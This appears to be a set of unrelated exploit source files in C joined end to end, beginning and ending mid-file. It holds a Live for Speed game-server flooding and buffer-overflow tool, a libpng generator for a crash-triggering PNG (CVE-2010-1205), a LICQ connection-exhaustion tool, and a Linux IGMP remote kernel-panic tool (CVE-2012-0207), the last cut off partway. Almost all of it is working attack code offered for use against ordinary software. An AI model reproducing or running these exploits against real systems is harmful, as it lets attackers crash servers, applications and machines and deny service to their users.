            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include "lfscrc.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
    DWORD       tid;
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
    #include <pthread.h>

    #define ONESEC  1
    #define stristr strcasestr
    pthread_t   tid;
#endif

#ifdef WIN32
    #define MSTHREAD(NAME,ARG)  DWORD WINAPI NAME(ARG)
    #define MSTHREADX(TID,THR,PAR) \
        if(!CreateThread(NULL, 0, (void *)&THR, (void *)PAR, 0, &TID)) { \
            printf("\nError: Unable to create thread\n"); \
            exit(1); \
        }
#else
    #define MSTHREAD(NAME,ARG)  void *NAME(ARG)
    #define MSTHREADX(TID,THR,PAR) \
        if(pthread_create(&TID, NULL, (void *)&THR, (void *)PAR)) { \
            printf("\nError: Unable to create thread\n"); \
            exit(1); \
        }
#endif



#define VER             "0.2.1"
#define BUFFSZ          256
#define PORT            63392
#define MAXSOCK         128
#define WAITSEC         5
#define TIMEOUT         30

typedef uint8_t         u8;
typedef uint16_t        u16;
typedef uint32_t        u32;



MSTHREAD(client, void);
int getxx(u8 *data, u32 *ret, int bits);
int putxx(u8 *data, u32 num, int bits);
int putmm(u8 *data, u8 *src, int len);
int getmm(u8 *data, u8 **dst, int len);
int rnds(u8 *data, int len);
int lfs_ver(u8 *dest, u8 *ver);
int send_lfs(int sock, u8 *data, u8 len);
int recv_lfs(int sock, u8 *buff);
int connetti(void);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



struct sockaddr_in  peer;
u_int   seed;
int     ready,
        full,
        disc,
        srvbuild    = 0,
        attack      = 0,
        demo        = 0;    // note that this tool uses a lot of work-arounds for working
u8      ver[8],             // on more versions... so if this code sux it's normal
        *password   = "";



int main(int argc, char *argv[]) {
    int     sd,
            i,
            len,
            received;
    u16     port    = PORT;
    u8      buff[BUFFSZ],
            maj,
            min,
            *host,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Live for Speed Fake Players DoS "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s [options] <host>\n"
            "\n"
            "Options:\n"
            "-p PORT  port used by the server (%hu)\n"
            "-w PASS  specify the server's password\n"
            "-v VER   version to use (automatically scanned)\n"
            "-b NUM   build number (automatically scanned)\n"
            "\n"
            "Attacks versus version <= 0.5X10:\n"
            "-1       in-game nickname's buffer-overflow with packet ID 3\n"
            "-2       in-game crash (track's buffer-overflow) with packet ID 10\n"
            "-3       NULL pointer crash versus internet and hidden S1/S2 servers\n"
            "-4       memcpy() crash versus internet S1/S2 servers\n"
            "\n"
            "Note: this tool works only versus demo servers (except where is written\n"
            "      differently) but with some small modifications could work versus\n"
            "      other versions (S1/S2) too\n"
            "\n", argv[0], port);
        exit(1);
    }

    *ver = 0;

    argc--;
    for(i = 1; i < argc; i++) {
        switch(argv[i][1]) {
            case 'p': port     = atoi(argv[++i]);           break;
            case 'w': password = argv[++i];                 break;
            case 'v': strncpy(ver, argv[++i], sizeof(ver)); break;
            case 'b': srvbuild = atoi(argv[++i]);           break;
            case '1': attack   = 1;                         break;
            case '2': attack   = 2;                         break;
            case '3': attack   = 3;                         break;
            case '4': attack   = 4;                         break;
            default: {
                printf("\nError: wrong command-line argument (%s)\n\n", argv[i]);
                exit(1);
                } break;
        }
    }

    host = argv[argc];
    p = strchr(host, ':');
    if(p) {
        *p = 0;
        port = atoi(p + 1);
    }

    peer.sin_addr.s_addr = resolv(host);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    if(!*ver) {
        printf("- get server version:\n");

        sd = connetti();
        received = 0;

        for(maj = 0; maj < 10; maj++) {
            for(min = 0; min < 10; ) {
                sprintf(ver, "%hhu.%hhu", maj, min);

                lfs_ver(buff, ver);
                putxx(buff + 4, 28, 8);         // 29
                putxx(buff + 5, 0, 8);          // not needed
                putxx(buff + 8, 0, 32);

                if(send_lfs(sd, buff, 12) < 0) std_err();
                len = recv_lfs(sd, buff);
                if(len < 0) {
                    if(!received) goto ver_found;
                    // printf("- connection lost\n");
                    close(sd);
                    sd = connetti();
                    received = 0;
                    continue;
                    // goto ver_found;          // std_err();
                }

                received += len;
                printf("\t%hhu.%hhu.%-5d = %s\n", maj, min, srvbuild, buff);

                if(stristr(buff, "differ")) {
                    min++;
                } else if(!strchr(buff, '.')) {
                    srvbuild++;
                } else {
                    goto ver_found;
                }
            }
        }

ver_found:
        close(sd);

        p = strchr(buff, '.');
        if(!p) {
            for(;;) {
                sd = connetti();

                srvbuild++;
                lfs_ver(buff, ver);
                putxx(buff + 4, 28, 8);         // 29
                putxx(buff + 5, 0, 8);          // not needed
                putxx(buff + 8, 0, 32);
                if(send_lfs(sd, buff, 12) < 0) std_err();
                len = recv_lfs(sd, buff);
                close(sd);
                if((len >= 0) && strchr(buff, '.')) break;
            }
        }

        p = strchr(buff, '.');
        if(!p) {
            printf("\n"
                "Error: no version found, use the -v option. reply received:\n"
                "       %s\n"
                "\n", buff);
            exit(1);
        }
        sprintf(ver, "%hhu.%hhu%c%s", maj, min, p[2], p + 3);
        printf("\n- set version:   %s (%d)\n", ver, srvbuild);

        sd = connetti();

        lfs_ver(buff, ver);
        putxx(buff + 4, 29, 8);     // 29
        putxx(buff + 5, 1, 8);      // 1
        putxx(buff + 8, 0, 32);

        send_lfs(sd, buff, 12);
        len = recv_lfs(sd, buff);
        if(len < 0) {
            printf("\nAlert: no info received\n");
            goto ver_found;
        } else {
            if(stristr(buff, "Host is ")) goto ver_found;
            printf("\n"
                "- server name   %s\n"
                "- players       %hhu/%hhu\n",
                buff + 4,
                buff[0], buff[1]);
        }

        close(sd);
    }

    seed = time(NULL);

    printf("- start attack:\n");
    for(;;) {
        disc = 0;
        full = 0;

        for(i = 0; !full; i++) {
            printf("\n  Player: ");

            ready = 0;
            MSTHREADX(tid, client, NULL);

            while(!ready) sleep(ONESEC);    // all these sleep() are needed!
            sleep(ONESEC * 2);              // seems to exists a limit in LFS
        }

        if(i <= 1) {
            for(i = WAITSEC; i >= 0; i--) {
                printf("%3d\b\b\b", i);
                sleep(ONESEC);
            }
        } else {
            printf("\n"
                "- wait some seconds and then stop this tool\n"
                "  hopefully the server will restart or will be confused for a while\n");
            while(!disc) sleep(ONESEC);
        }
    }

    return(0);
}



MSTHREAD(client, void) {
    u32     chall,
            crc;
    int     sd,
            sdu,
            i,
            len;
    u8      buff[BUFFSZ],
            id,
            *p;

    sd = connetti();
    chall = 0;

    if(attack == 4) {
        lfs_ver(buff, ver);
        putxx(buff + 4, 29, 8);
        putxx(buff + 5, 5,  8);
        putxx(buff + 8, 0, 32);

        if(send_lfs(sd, buff, 12) < 0) goto end;

        len = recv_lfs(sd, buff);
        if(len < 0) goto end;

        printf("\n"
            "- malicious data sent, the tool now will continue normally if the server is\n"
            "  not vulnerable or will give an error if it's crashed\n");

        goto end;
    }

redo:
    for(;;) {
        lfs_ver(buff, ver);
        putxx(buff + 4, 29, 8);     // valid: 29
        putxx(buff + 5, 3,  8);     // valid: 3, 5
        putxx(buff + 8, chall, 32);
        p = buff + 12;
        if(!demo) {
            p += rnds(p, 24);       // nickname
            if(attack == 3) p[23] = 0;  // yes, that's all!!!
            p += rnds(p, 8);        // targa
            p += rnds(p, 8);        // ???
        }

        if(send_lfs(sd, buff, p - buff) < 0) goto end;

        len = recv_lfs(sd, buff);
        if(len < 0) goto end;

        if(len != 4) break;
        chall = lfscrc_pwd(*(u32 *)buff, password);
    }

    if(len == 32) {
        printf("  %s\n", buff);
        if(stristr(buff, "full")) {
            full = 1;
        } else if(stristr(buff, "password")) {
            printf("\n- use the -w option for specifying the password\n\n");
            exit(1);
        } else if(!demo && stristr(buff, "Host is ")) {
            demo = 1;
            chall = 0;
            goto redo;
        } else {
            printf("\nError: %s\n", buff);
            exit(1);
        }
        goto end;
    }

    lfs_ver(buff, ver);
    putxx(buff + 4, 29, 8);
    putxx(buff + 5, 0,  8);
    putxx(buff + 8, 0, 32);
    p = buff + 12;
    if(!demo) {
        p += rnds(p, 8);
    }

    if(send_lfs(sd, buff, p - buff) < 0) goto end;
    len = recv_lfs(sd, buff);
    if(len < 0) goto end;

    sdu = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sdu < 0) std_err();
    sendto(sdu, "LFS\0", 4, 0, (struct sockaddr *)&peer, sizeof(peer));
    sleep(0);   // double sending is better
    sendto(sdu, "LFS\0", 4, 0, (struct sockaddr *)&peer, sizeof(peer));
    close(sdu);

    len = recv_lfs(sd, buff);
    if(len < 0) goto end;

    getxx(buff + 12, &crc, 32);
    lfscrc(buff, crc, 3);
    putxx(buff + 12, 0, 32);

    if(send_lfs(sd, buff, 16) < 0) goto end;
    len = recv_lfs(sd, buff);
    if(len < 0) goto end;
    if(stristr(buff, "don't match")) {
        printf("\nError: %s\n", buff);
        exit(1);
    }

    do {
        p = buff;
        p += putxx(p, 1,  8);
        p += putxx(p, 22, 8);
        p += putxx(p, 0,  8);
        p += putxx(p, 0,  8);
        p += putxx(p, 0,  8);
        if(send_lfs(sd, buff, p - buff) < 0) goto end;
        len = recv_lfs(sd, buff);
        if(len < 0) goto end;
    } while(buff[0] != 19);
    //id = buff[1];
    id = 4;

    p = buff;
    p += putxx(p, 1,  8);
    p += putxx(p, 24, 8);
    p += putxx(p, id, 8);
    p += putxx(p, 0,  8);
    p += putxx(p, 0,  8);
    p += rnds(p, 24);       // nickname
    p += rnds(p, 8);        // targa

    if(send_lfs(sd, buff, p - buff) < 0) goto end;
    len = recv_lfs(sd, buff);
    if(len < 0) goto end;

    if((attack == 1) || (attack == 2))  {
        printf("\n- test attack %d\n", attack);

        p = buff;
        p += putxx(p, 1,  8);
        p += putxx(p, (attack == 1) ? 3 : 10, 8);
        p += putxx(p, 0,  8);
        p += putxx(p, 0,  8);
        p += putxx(p, 0,  8);
        memset(p, 'A', 250);    // 250 is the max allowed here
        p += 250;

        if(send_lfs(sd, buff, p - buff) < 0) goto end;
        len = recv_lfs(sd, buff);
        if(len < 0) goto end;

        printf("\n"
            "- malicious data sent, the tool now will continue normally if the server is\n"
            "  not vulnerable or will give an error if it's crashed\n");
    }

    ready = 1;
    for(i = 0; (len = recv_lfs(sd, buff)) > 0; i++) {
        if(!(i & 15)) { // sync data

            if(send_lfs(sd,
                "\x00\x99\x6a\xf9\xff\x18\x2f\xd2\xc8\x2c\x00\x00\xf3\xdc\x4f\x85"
                "\x00\x00\xe1\x3b\xed\x00\x98\x51\xb2\xe3\x37\x90\x33\xa3",
                30) < 0) goto end;

            if(send_lfs(sd, "\x00\xa0\x1b\x04\x00\x04\x0d\x16\xe3\x07", 10) < 0) goto end;

            fputc('o', stdout);
        } else {
            if(send_lfs(sd, buff, len) < 0) goto end;
        }

        sleep(ONESEC);  // limit for the amount of data to send/receive
        if(disc) goto end;
    }
    disc = 1;

end:
//    shutdown(sd, 2);
    close(sd);
    if(!ready) ready = 1;
    return(0);
}



int getxx(u8 *data, u32 *ret, int bits) {
    u32     num;
    int     i,
            bytes;

    bytes = bits >> 3;

    for(num = i = 0; i < bytes; i++) {
        num |= (data[i] << (i << 3));
    }

    *ret = num;
    return(bytes);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;

    for(i = 0; i < bytes; i++) {
        data[i] = num >> (i << 3);
    }

    return(bytes);
}



int putmm(u8 *data, u8 *src, int len) {
    if(len < 0) {
        len = sprintf(data, "%s", src) + 1;
    } else {
        memcpy(data, src, len);
    }
    return(len);
}



int getmm(u8 *data, u8 **dst, int len) {
    *dst = data;
    if(len < 0) {
        len = strlen(data) + 1;
    }
    return(len);
}



int rnds(u8 *data, int size) {
    int     i,
            len;
    u8      *p = data;
    const static u8 table[] =
                "0123456789"
                "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                "abcdefghijklmnopqrstuvwxyz";

    len = seed % size;
    if(len < 3) len = 3;    // at least a minimum

    for(i = 0; i < len; i++) {
        seed = (seed * 0x343FD) + 0x269EC3;
        *p++ = table[seed % (sizeof(table) - 1)];
    }
    for(; len < size; len++) {
        *p++ = 0;
    }
    return(p - data);
}



int lfs_ver(u8 *dest, u8 *verx) {
    u32     build;

    sscanf(verx, "%hhu.%hhu%c%hhu", &dest[0], &dest[1], &dest[2], &dest[3]);
    switch(dest[0]) {
        case 0:  build =     0; break;  // demo
        case 1:  build = 10000; break;  // S1
        case 2:  build = 20000; break;  // S2
        case 3:  build = 30000; break;  // S3
        default: {
            printf("\nError: unexistent build version (%d)\n", dest[0]);
            exit(1);
        }
    }
    build += srvbuild;

    *(u16 *)(dest + 6) = build;
    return(10);
}



int send_lfs(int sock, u8 *data, u8 len) {
    u8      buff[256];

    buff[0] = len;
    memcpy(buff + 1, data, len);    // this is the fastest solution, really!!!
    if(send(sock, buff, len + 1, 0) != (len + 1)) return(-1);
    fputc('.', stdout);
    return(0);
}



int recv_lfs(int sock, u8 *buff) {
    int     t;
    u8      len = 0,
            size;

    if(timeout(sock, TIMEOUT) < 0) return(-1);
    if(recv(sock, &size, 1, 0) <= 0) return(-1);

    while(len < size) {
        if(timeout(sock, TIMEOUT) < 0) return(-1);
        t = recv(sock, buff + len, size - len, 0);
        if(t <= 0) return(-1);
        len += t;
    }
    buff[len] = 0;  // useless except for some strings

    fputc('.', stdout);
    return(len);
}



int connetti(void) {
    int     sd;

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(struct sockaddr_in))
      < 0) std_err();
    return(sd);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fdr;
    int     err;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fdr);
    FD_SET(sock, &fdr);
    err = select(sock + 1, &fdr, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*
 Exploit Title:     libpng <= 1.4.2 DoS    
 Date:              July 20, 2010
 Author:            kripthor
 Software Link:     http://www.libpng.org/pub/png/libpng.html
 Version:           all products that use libpng <= 1.4.2 
 Tested on:         Windows XP Pro SP3 Eng / Ubuntu 10 
 CVE :				CVE-2010-1205
 Notes:             This crashes Firefox <= 3.6.6 and Thunderbird <= 3.0.4
					inkscape, png2html, etc...
  					ALL products that use libpng <= 1.4.2 maybe vulnerable.
  								
 References:
  					libpng.org
  					RFC-2083
  					RFC 1950
  					RFC 1951
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <assert.h>
#include <unistd.h>


#define BASE 65521L /* largest prime smaller than 65536 */

      /*
         Update a running Adler-32 checksum with the bytes buf[0..len-1]
       and return the updated checksum. The Adler-32 checksum should be
       initialized to 1.

       Usage example:

         unsigned long adler = 1L;

         while (read_buffer(buffer, length) != EOF) {
           adler = update_adler32(adler, buffer, length);
         }
         if (adler != original_adler) error();
      */
      unsigned long update_adler32(unsigned long adler, unsigned char *buf, int len)
      {
        unsigned long s1 = adler & 0xffff;
        unsigned long s2 = (adler >> 16) & 0xffff;
        int n;

        for (n = 0; n < len; n++) {
          s1 = (s1 + buf[n]) % BASE;
          s2 = (s2 + s1)     % BASE;
        }
        return (s2 << 16) + s1;
      }

      /* Return the adler32 of the bytes buf[0..len-1] */

      unsigned long adler32(unsigned char *buf, int len)
      {
        return update_adler32(1L, buf, len);
      }


/* CRC based on implementation by Finn Yannick Jacobs */
/* crc_tab[] -- this crcTable is being build by chksum_crc32GenTab().
 *		so make sure, you call it before using the other
 *		functions!
 */
u_int32_t crc_tab[256];

/* chksum_crc() -- to a given block, this one calculates the
 *				crc32-checksum until the length is
 *				reached. the crc32-checksum will be
 *				the result.
 */
unsigned int chksum_crc32 (char *block, unsigned int length)
{
   register unsigned long crc;
   unsigned long i;

   crc = 0xFFFFFFFF;
   for (i = 0; i < length; i++)
   {
      crc = ((crc >> 8) & 0x00FFFFFF) ^ crc_tab[(crc ^ *block++) & 0xFF];
   }
   return (crc ^ 0xFFFFFFFF);
}

/* chksum_crc32gentab() --      to a global crc_tab[256], this one will
 *				calculate the crcTable for crc32-checksums.
 *				it is generated to the polynom [..]
 */

void chksum_crc32gentab ()
{
   unsigned long crc, poly;
   int i, j;

   poly = 0xEDB88320L;
   for (i = 0; i < 256; i++)
   {
      crc = i;
      for (j = 8; j > 0; j--)
      {
	 if (crc & 1)
	 {
	    crc = (crc >> 1) ^ poly;
	 }
	 else
	 {
	    crc >>= 1;
	 }
      }
      crc_tab[i] = crc;
   }
}


int main(void) {

chksum_crc32gentab();

// VALID PNG FILE BEGINS

//PNG FILE SIGNATURE
char PNG_SIGN[] = "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a";
// IHDR CHUNCK size 
char PNG_IHDR_SIZE[] = "\x00\x00\x00\x0d";
// IHDR CHUNCK IHDR string id
char PNG_IHDR[] = "IHDR";
// IMAGE WIDTH 4 bytes
char PNG_IHDR_WIDTH[] = "\x00\x00\x00\x10";
// IMAGE HEIGTH 4 bytes
char PNG_IHDR_HEIGHT[] = "\x00\x00\x00\x02";
// IMAGE ATTRS 5 bytes: bit depth, color type, compression, filter and interlace method
char PNG_IHDR_ATTRS[] = "\x08\x06\x00\x00\x00";
// CRC32 excluding size!
//char PNG_IHDR_CRC32[] = "\x51\xed\x5c\xf1";

// OTHER FIELDS sRGB, pHYs, tIME 
char PNG_OTHER_FIELDS[] ="\x00\x00\x00\x01\x73\x52\x47\x42\x00\xae\xce\x1c\xe9\x00\x00\x00\x09\x70\x48\x59\x73\x00\x00\x0b\x13\x00\x00\x0b\x13\x01\x00\x9a\x9c\x18\x00\x00\x00\x07\x74\x49\x4d\x45\x07\xda\x07\x0c\x14\x1c\x38\x52\xdd\x18\x2e";

// IDAT CHUNCK SIZE
char PNG_IDAT_SIZE[] = "\x00\x00\x00\x8d";
// IDAT CHUNCK IDAT string id
char PNG_IDAT[] = "IDAT";
// data in zlib format! 
char PNG_IDAT_DATA_ZLIB_HEADER[] = "\x08\x1d\x01\x82\x00\x7d\xff";
// zlib content, size in RGBa with no compression = height*width*4;
//char PNG_IDAT_DATA_ZLIB_CONTENT[] = "\x01\xff\x00\x00\xff\x01\xff\x30\x00\x00\x01\xcf\x00\x2b\x2a\x2b\x00\x11\x12\x11\x00\x10\x10\x11\x00\x11\x11\x11\x00\x11\x11\x11\x00\x11\x11\x12\x00\x11\x11\x10\x00\x11\x11\x10\x00\x11\x11\x12\x00\x10\x11\x11\x00\x11\x11\x11\x00\x12\x11\x10\x00\x10\x10\x11\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01\x00\xff\xff\x00\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x01\x00\xff\x00\x00\x00\x01\x00\xff\x00\x01\x00\x00\x00\xff\xff\x01\x00\x01\x01\x00\x00";
// adler32 of zlib_content
//char PNG_IDAT_DATA_ZLIB_ADLER32[] = "\xb1\xa6\x0d\xe5";

// CRC32 excluding size!
//char PNG_IDAT_CRC32[] = "\x88\x3b\xb3\xfe";

// IEND CHUNCK
char PNG_IEND_CHUNCK[] = "\x00\x00\x00\x00\x49\x45\x4e\x44\xae\x42\x60\x82"; 

// VALID PNG FILE ENDS




//-----------------------------------------------------------------------------------
//---------------------------------
// TRIGGER OVERFLOW.  
// WE ARE GOING TO CREATE A PNG WITH 2 ROWS AND MARK IT AS HAVING 1 ROW
// OUR BUFFER CAN BE width*height*4+height in size

// CHOOSE A WIDTH (crashes occur around 512 width)
int WIDTH = 700;
unsigned int w = htonl(WIDTH);
memcpy(PNG_IHDR_WIDTH,&w,4);

int HEIGHT = 2;
// TRIGGER OVERFLOW REPORT HEIGHT-1 IN THE HEADER
unsigned int h = htonl(HEIGHT-1);
memcpy(PNG_IHDR_HEIGHT,&h,4);

// USE THIS BUFFER FOR YOUR PWNSAUCE ? 
int idat_zlib_data_size = WIDTH*HEIGHT*4+HEIGHT;
unsigned char *buf = malloc(idat_zlib_data_size);
memset(buf,0x41,idat_zlib_data_size);
// USE THIS BUFFER FOR YOUR PWNSAUCE ?

// FIX ZLIB HEADERS IN THE IDAT BLOCK
short int zblock_size = (short int) idat_zlib_data_size;
short int zblock_size_2c = -zblock_size-1;
memcpy(PNG_IDAT_DATA_ZLIB_HEADER+3,&zblock_size,2);
memcpy(PNG_IDAT_DATA_ZLIB_HEADER+5,&zblock_size_2c,2);

unsigned int idat_new_size = htonl(idat_zlib_data_size+11);
memcpy(PNG_IDAT_SIZE,&idat_new_size,4);

//---------------------------------
//-----------------------------------------------------------------------------------




FILE * f;

f = fopen ( "xploit.png" , "wb" );
fwrite (PNG_SIGN , 1 , sizeof(PNG_SIGN)-1 , f );
fwrite (PNG_IHDR_SIZE , 1 , sizeof(PNG_IHDR_SIZE)-1 , f );
fwrite (PNG_IHDR , 1 , sizeof(PNG_IHDR)-1 , f );
fwrite (PNG_IHDR_WIDTH , 1 , sizeof(PNG_IHDR_WIDTH)-1 , f );
fwrite (PNG_IHDR_HEIGHT , 1 , sizeof(PNG_IHDR_HEIGHT)-1 , f );
fwrite (PNG_IHDR_ATTRS , 1 , sizeof(PNG_IHDR_ATTRS)-1 , f );

//fwrite (PNG_IHDR_CRC32 , 1 , sizeof(PNG_IHDR_CRC32)-1 , f );
//CALCULATE NEW CRC
int ihdr_data_size = sizeof(PNG_IHDR)-1+sizeof(PNG_IHDR_WIDTH)-1+sizeof(PNG_IHDR_HEIGHT)-1+sizeof(PNG_IHDR_ATTRS)-1;
char* ihdr_data = malloc(ihdr_data_size);
memcpy(ihdr_data,PNG_IHDR,sizeof(PNG_IHDR)-1);
memcpy(ihdr_data+sizeof(PNG_IHDR)-1,PNG_IHDR_WIDTH,sizeof(PNG_IHDR_WIDTH)-1);
memcpy(ihdr_data+sizeof(PNG_IHDR)-1+sizeof(PNG_IHDR_WIDTH)-1,PNG_IHDR_HEIGHT,sizeof(PNG_IHDR_HEIGHT)-1);
memcpy(ihdr_data+sizeof(PNG_IHDR)-1+sizeof(PNG_IHDR_WIDTH)-1+sizeof(PNG_IHDR_HEIGHT)-1,PNG_IHDR_ATTRS,sizeof(PNG_IHDR_ATTRS)-1);
unsigned int crc32_ihdr = htonl(chksum_crc32(ihdr_data,ihdr_data_size));
fwrite ( &crc32_ihdr, 1 , 4 , f );

fwrite (PNG_OTHER_FIELDS , 1 , sizeof(PNG_OTHER_FIELDS)-1 , f );

fwrite (PNG_IDAT_SIZE , 1 , sizeof(PNG_IDAT_SIZE)-1 , f );
fwrite (PNG_IDAT , 1 , sizeof(PNG_IDAT)-1 , f );
fwrite (PNG_IDAT_DATA_ZLIB_HEADER , 1 , sizeof(PNG_IDAT_DATA_ZLIB_HEADER)-1 , f );
fwrite (buf , 1 ,idat_zlib_data_size,f);

//CALCULATE NEW ADLER-32 FOR ZLIB DATA
unsigned int adler32_zlib_data = htonl(adler32(buf,idat_zlib_data_size));
fwrite ( &adler32_zlib_data, 1 , 4 , f );


//CALCULATE NEW CRC
int idat_data_size = sizeof(PNG_IDAT)-1+sizeof(PNG_IDAT_DATA_ZLIB_HEADER)-1+idat_zlib_data_size+4;
char* idat_data = malloc(idat_data_size);
memcpy(idat_data,PNG_IDAT,sizeof(PNG_IDAT)-1);
memcpy(idat_data+sizeof(PNG_IDAT)-1,PNG_IDAT_DATA_ZLIB_HEADER,sizeof(PNG_IDAT_DATA_ZLIB_HEADER)-1);
memcpy(idat_data+sizeof(PNG_IDAT)-1+sizeof(PNG_IDAT_DATA_ZLIB_HEADER)-1,buf,idat_zlib_data_size);
memcpy(idat_data+sizeof(PNG_IDAT)-1+sizeof(PNG_IDAT_DATA_ZLIB_HEADER)-1+idat_zlib_data_size,&adler32_zlib_data,4);
unsigned int crc32_idat = htonl(chksum_crc32(idat_data,idat_data_size));
fwrite ( &crc32_idat, 1 , 4 , f );

fwrite (PNG_IEND_CHUNCK , 1 , sizeof(PNG_IEND_CHUNCK)-1 , f );
fclose (f);

//OPEN XPLOIT.PNG WITH YOUR FAVORITE BROWSER/IMAGE EDIT APP/ETC

return 0;


}
source: http://www.securityfocus.com/bid/28679/info

LICQ is prone to a remote denial-of-service vulnerability because the application fails to handle exceptional conditions.

A remote attacker can exploit this issue to crash the affected application, denying service to legitimate users. The attacker may also be able to execute code, but this has not been confirmed. 

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

// change to suit your needs
#define MAX 1024

int fds[MAX];

int main(int argc, char *argv[])
{
   int port,a;
   char host[12];
   struct sockaddr_in victim;
   struct in_addr inp;

   if (argc!=3)
   {
       printf("usage: %s <ip> <port>\n",argv[0]);
       exit(1);
   }

   port=atoi(argv[2]);
   strcpy(host,argv[1]);
   printf("ip=%s\n",host);

   for (a=1;a<=MAX;a++)
   {
       fds[a]=socket(PF_INET,SOCK_STREAM,0);
       victim.sin_family= AF_INET;
       victim.sin_port=htons(port);
       inet_aton(host,&victim.sin_addr);
       connect(fds[a],&victim,sizeof(victim));
   }

   printf("done!");

}

/*
** linux-undeadattack.c
** Linux IGMP Remote Denial Of Service (Introduced in linux-2.6.36)
** CVE-2012-0207
** credits to Ben Hutchings:
** http://womble.decadent.org.uk/blog/igmp-denial-of-service-in-linux-cve-2012-0207.html
** written By Kingcope
** Year 2012
** Ripped & modified code written by Firestorm
** Tested against * OpenSuSE 11.4 system
**		  * Recent Ubuntu Distro
**
** Example:
** ./undeadattack 192.168.2.16 192.168.2.3
** The Linux Kernel at the remote side will Panic
** when sent over the network :>
** ENJOY!
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>


struct iphdr
{
  unsigned char ihl:4, version:4, tos;
  unsigned short tot_len, id, frag_off;
  unsigned char ttl, protocol;
  unsigned short check;
  unsigned int saddr, daddr;
  unsigned int options1;
  unsigned int options2;
};


struct igmp_query {
        unsigned char type;
        unsigned char maxresponse;
        unsigned short csum;
        unsigned int mcast;
        char padding[40];
};


unsigned short in_chksum(unsigned short *, int);
long resolve(char *);


long resolve(char *host)
{
  struct hostent *hst;
  long addr;


  hst = gethostbyname(host);
  if (hst == NULL)
    return(-1);


  memcpy(&addr, hst->h_addr, hst->h_length);


  return(addr);
}


int main(int argc, char *argv[])
{
  struct sockaddr_in dst;
  struct iphdr *ip;
  struct igmp_query *igmp;
  long daddr, saddr;
  int s, i=0, c, len, one=1;
  char buf[1500];


  if (argc < 3)
  {
    printf("Linux IGMP Remote Denial Of Service (Introduced in linux-2.6.36)\n"
	   "credits to Ben Hutchings\nwritten by Kingcope\n"
	   "Ripped & modified code written by Firestorm\n");
    printf("Usage: %s <src> <dst>\n", *argv);
    return(1);
  }


  daddr = resolve(argv[2]);
  saddr = resolve(argv[1]);

  memset(buf, 0, 1500);
  ip = (struct iphdr *)&buf;
  igmp = (struct igmp_query*)&buf[sizeof(struct iphdr)];

  dst.sin_addr.s_addr = daddr;
  dst.sin_family = AF_INET;

  ip->ihl = 7;
  ip->version = 4;
  ip->tos = 0;
  ip->tot_len = htons(sizeof(struct iphdr)+8);
  ip->id = htons(18277);
  ip->frag_off=0;
  ip->ttl = 1;
  ip->protocol = IPPROTO_IGMP;
  ip->check = in_chksum((unsigned short *)ip, sizeof(struct iphdr));
  ip->saddr = saddr;
  ip->daddr = daddr;
  ip->options1 = 0;
  ip->options2 = 0;
  igmp->type = 0x11;
  igmp->maxresponse = 0xff;
  igmp->mcast=inet_addr("224.0.0.1");

  igmp->csum = 0; //For computing the checksum, the Checksum field is set to zero.
  igmp->csum=in_chksum((unsigned short *)igmp, 8);

  s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (s == -1)
    return(1);

  printf("Sending IGMP packet: %s -> %s\n", argv[1], argv[2]);

      if (sendto(s,&buf,sizeof(struct iphdr)+8,0,(struct sockaddr *)&dst,sizeof(struct sockaddr_in)) == -1)
      {
        perror("Error sending packet");
        exit(-1);
      }

  close(s);

  s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (s == -1)
    return(1);

  ip->id = htons(18278);
  ip->tot_len = sizeof(struct iphdr)+12;
  igmp->type = 0x11;
  igmp->maxresponse = 0;
  igmp->mcast=inet_addr("0.0.0.0");

  igmp->csum = 0; //For computing the checksum, the Checksum field is set to zero.
  igmp->csum=in_chksum((unsigned short *)igmp, 12);

